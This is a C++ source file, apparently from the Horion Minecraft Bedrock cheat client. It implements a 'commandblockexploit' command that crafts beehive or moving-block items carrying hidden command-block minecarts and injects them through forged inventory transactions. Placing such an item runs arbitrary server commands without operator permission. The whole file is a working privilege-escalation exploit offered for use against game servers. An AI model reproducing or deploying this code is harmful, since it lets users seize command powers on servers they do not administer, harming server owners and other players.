#include "CommandBlockExploitCommand.h"

#include <thread>

#include "../../../SDK/Tag.h"
#include "../../Module/ModuleManager.h"

CommandBlockExploitCommand::CommandBlockExploitCommand() : IMCCommand("commandblockexploit", "Workaround for executing commands without op", " <BH || MB ||> <Command>") {
	registerAlias("cbe");
}

CommandBlockExploitCommand::~CommandBlockExploitCommand() {
}

bool CommandBlockExploitCommand::execute(std::vector<std::string>* args) {
	if (args->at(1) == "BH") {
		assertTrue(args->size() > 2);
		std::ostringstream os;
		for (int i = 2; i < args->size(); i++) {
			if (i > 2)
				os << " ";
			os << args->at(i);
		}
		C_ItemStack* yot = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("beehive")), 1, 0);
		int slot = g_Data.getLocalPlayer()->getSupplies()->inventory->getFirstEmptySlot();
		std::string cmd = os.str();
		std::string tag = "{Count:1b,Damage:15s,Name:\"minecraft:beehive\",tag:{Occupants:[{ActorIdentifier:""\"minecraft:command_block_minecart<>""\",SaveData:{Command:\"" + cmd + "\",Ticking:1b,TicksLeftToStay:1}}]}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		clientMessageF("[%Horion%s] %sPlace the beehive to spawn a command block minecart with a command already inside!", GOLD, WHITE, GREEN);
		return true;
	}
	if (args->at(1) == "MB") {
		assertTrue(args->size() > 2);
		std::ostringstream os;
		for (int i = 2; i < args->size(); i++) {
			if (i > 2)
				os << " ";
			os << args->at(i);
		}
		C_ItemStack* yot = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("movingblock")), 1, 0);
		int slot = g_Data.getLocalPlayer()->getSupplies()->inventory->getFirstEmptySlot();
		std::string cmd = os.str();
		std::string tag2 = "{Count:1b,Damage:0s,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:leaves\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:\"" + cmd + "\"\,ExecuteOnFirstTick:1b,TickDelay:0,Ticking:1b,definitions:[\"+minecraft:boat\"]}TicksLeftToStay:0}],ShouldSpawnBees:0b,id:\"Beehive\",isMovable:1b}ench:[{id:-1s,lvl:1s}],RepairCost:0,display:{Name:\"\",Lore:[\"" + cmd + "\"]}}}";
		yot->fromTag(*Mojangson::parseTag(tag2));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		clientMessageF("[%Horion%s] %sPlace the Moving block to spawn a command block boat with a command already inside!", GOLD, WHITE, GREEN);
		return true;
	}
}
